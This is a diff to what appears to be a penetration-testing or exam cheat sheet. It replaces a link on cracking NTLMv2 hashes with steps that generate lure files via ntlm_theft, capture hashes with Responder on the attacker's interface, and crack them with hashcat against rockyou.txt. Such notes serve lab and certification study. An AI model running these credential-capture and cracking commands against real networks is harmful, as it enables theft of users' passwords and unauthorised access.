@@ -172,9 +172,15 @@ Elapsed Time: 9 Minutes
 
 
 ## Cracking NTLMv2 Hashes from a Packet Capture
-You may be asked to recover a password from an SMB authentication (NTLMv2) from a Packet Capture.
-The following is a 9-step process for formatting the hash correctly to do this.
-https://research.801labs.org/cracking-an-ntlmv2-hash/
+
+Go here and get this:
+https://github.com/Greenwolf/ntlm_theft
+
+1. Make all the files using your tun0 ip.
+2. responder -I tun0 -A
+3. Copy entire hash into a file
+4. hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt 
+
 
 ## To crack linux hashes you must first unshadow them
 
